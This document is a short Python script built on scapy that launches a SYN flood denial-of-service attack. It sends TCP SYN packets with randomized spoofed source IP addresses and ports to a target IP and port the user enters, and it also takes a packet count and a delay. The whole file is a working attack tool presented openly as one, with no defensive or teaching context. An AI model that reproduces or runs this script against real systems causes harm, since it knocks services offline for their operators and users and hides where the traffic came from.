import scapy.all as scapy
import random
import time

def generate_syn_flood(target_ip, target_port, count=1000, delay=0.01):
    """Generate SYN flood attack packets to target IP and port"""
    print(f"Starting SYN flood attack on {target_ip}:{target_port} with {count} packets")
    for _ in range(count):
        src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        src_port = random.randint(1024, 65535)
        ip_packet = scapy.IP(src=src_ip, dst=target_ip)
        tcp_packet = scapy.TCP(sport=src_port, dport=target_port, flags="S")
        packet = ip_packet / tcp_packet
        scapy.send(packet, verbose=False)
        time.sleep(delay)
    print("SYN flood attack completed.")

if __name__ == "__main__":
    target_ip = input("Enter target IP address: ").strip()
    target_port_input = input("Enter target port (default 80): ").strip()
    target_port = int(target_port_input) if target_port_input else 80
    packet_count_input = input("Enter number of packets to send (default 1000): ").strip()
    packet_count = int(packet_count_input) if packet_count_input else 1000
    delay_input = input("Enter delay between packets in seconds (default 0.01): ").strip()
    delay = float(delay_input) if delay_input else 0.01

    generate_syn_flood(target_ip, target_port, packet_count, delay)
